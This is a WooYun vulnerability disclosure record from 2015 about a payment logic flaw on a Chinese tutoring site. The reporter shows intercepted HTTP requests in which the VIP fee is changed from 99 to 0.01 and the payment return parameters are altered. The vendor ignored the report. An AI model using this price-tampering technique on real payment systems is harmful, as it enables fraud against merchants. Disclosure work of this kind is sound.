{"id": 35191, "wybug_id": "wooyun-2015-0104499", "wybug_title": "支付漏洞似乎并没有修复完善", "wybug_corp": "jiajiao400.com", "wybug_author": "ssss", "wybug_date": "2015-03-31 10:29", "wybug_open_date": "2015-04-05 10:30", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://wooyun.org/bugs/wooyun-2010-071602http://www.wooyun.org/bugs/wooyun-2014-070728看到这两个，说站长对支付漏洞修复的不够仔细，于是我又想再去查查了。 详细说明：  \n\n选个开通吧～99的\n\n\nGET /alipay/vip/alipayto.php?aliorder=%25E5%25B8%25B8%25E9%259D%2592%25E8%2597%25A4%25E5%25AE%25B6%25E6%2595%2599%25E7%25BD%2591%25E2%2580%2594%25E2%2580%2594%25E6%2594%25AF%25E4%25BB%2598VIP%25E4%25BC%259A%25E5%2591%2598%25E8%25B4%25B999%25E5%2585%2583&alibody=&alimoney=99&trade_no=20150328104402&pay_bank=CCB HTTP/1.1Host: www.jiajiao400.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.jiajiao400.com/bj/profiles/buyvip?dengji=2Cookie: PHPSESSID=78e5677244ad742efa4da558***aa6de; city=%E5%8C%97%E4%BA%AC%E5%B8%82; cityid=110100; domain=bj; __utma=51849266.586778186.1427552749.1427552749.1427552749.1; __utmb=51849266.7.10.1427552749; __utmc=51849266; __utmz=51849266.1427552749.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); pgv_pvi=693807104; pgv_si=s5767126016; Hm_lvt_39af567ee873406fd32bd45cac528457=1427552750; Hm_lpvt_39af567ee873406fd32bd45cac528457=1427553772; cqtcookietime=1459088760; cqtauth=c5523wT79vms%2B5hHV%2B0M7tnvD%2BKmZiy7iCEMEx3KLkLwOcIIbqLMrq8MRMT23gSziW7BjCrg6gJOu4amZmNOdt9eR%2BOoA2poL8A; ucenter_info=165140; __utmt=1Connection: keep-alive\n听说上次修复在支付后对数据的判断。那么这里的99仍然可以改，0.01吧。\n\n然后顺利支付，到了返回商户页面时候，注意了，不是把0.01数据得返回嘛，再次截断修改：\nGET /alipay/vip/return_url.php?bank_seq_no=20150328249704281074&buyer_email=kehuzijinbu012%40alipay.com&buyer_id=2088502970009103&exterface=create_direct_pay_by_user&is_success=T&notify_id=RqPnCoPT3K9%252Fvwbh3InTvaKTYX%252FXL7cCg270AMVwVn9n0TcLqj%252FQ7vlAkVHX%252Fx2un4ms&notify_time=2015-03-28+22%3A51%3A13&notify_type=trade_status_sync&out_trade_no=20150328104919&payment_type=1&seller_email=educqt%40163.com&seller_id=2088501841222900&subject=%E5%B8%B8%E9%9D%92%E8%97%A4%E5%AE%B6%E6%95%99%E7%BD%91%E2%80%94%E2%80%94%E6%94%AF%E4%BB%98VIP%E4%BC%9A%E5%91%98%E8%B4%B999%E5%85%83&total_fee=0.01&trade_no=2015032800001000100059384185&trade_status=TRADE_SUCCESS&sign=eb69a74e2ede511d1fd63f94f8ec5293&sign_type=MD5 HTTP/1.1Host: www.jiajiao400.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=78e5677244ad742efa4d＊＊＊＊＊29aa6de; city=%E5%8C%97%E4%BA%AC%E5%B8%82; cityid=110100; domain=bj; __utma=51849266.586778186.1427552749.1427552749.1427552749.1; __utmb=51849266.7.10.1427552749; __utmc=51849266; __utmz=51849266.1427552749.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); pgv_pvi=693807104; pgv_si=s5767126016; Hm_lvt_39af567ee873406fd32bd45cac528457=1427552750; Hm_lpvt_39af567ee873406fd32bd45cac528457=1427553772; cqtcookietime=1459088760; cqtauth=c5523wT79vms%2B5hHV%2B0M7tnvD%2BKmZiy7iCEMEx3KLkLwOcIIbqLMrq8MRMT23gSziW7BjCrg6gJOu4amZmNOdt9eR%2BOoA2poL8A; ucenter_info=165140; __utmt=1Connection: keep-alive\n99.00返回。其实我一直觉得这样是不可行的，试一试的态度。   漏洞证明：  \n\n   修复方案：  话说真的是漏洞吗。站长你查查。可爱的站长你会给礼物给高rank吗？   版权声明：转载请注明来源 ssss@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-05 10:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}